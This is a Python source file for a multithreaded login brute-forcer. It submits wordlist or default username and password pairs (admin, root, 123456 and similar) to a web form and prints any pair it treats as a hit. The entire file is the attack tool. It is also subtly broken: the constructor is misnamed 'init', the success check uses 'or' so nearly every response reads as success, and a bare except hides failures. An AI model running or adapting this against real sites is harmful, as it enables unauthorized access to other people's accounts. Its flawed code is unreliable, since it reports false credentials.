import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

class BruteForcer:
    def init(self, url, users=None, passwords=None, form=None, threads=10):
        self.url = url
        self.users = self.load_wordlist(users) if users else ["admin", "root", "test"]
        self.passwords = self.load_wordlist(passwords) if passwords else ["password", "123456", "admin"]
        self.form = form or "user={}&pass={}"
        self.threads = threads
        self.results = []

    def load_wordlist(self, path):
        with open(path) as f:
            return [line.strip() for line in f.readlines()]

    def try_credentials(self, user, password):
        data = self.form.format(user, password)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = requests.post(self.url, data=data, headers=headers, timeout=5)
            if "login" not in r.text.lower() or "invalid" not in r.text.lower():
                self.results.append({"user": user, "password": password, "status": "success"})
                print(f"[+] Found: {user}:{password}")
        except:
            pass

    def attack(self):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for user in self.users:
                for password in self.passwords:
                    executor.submit(self.try_credentials, user, password)
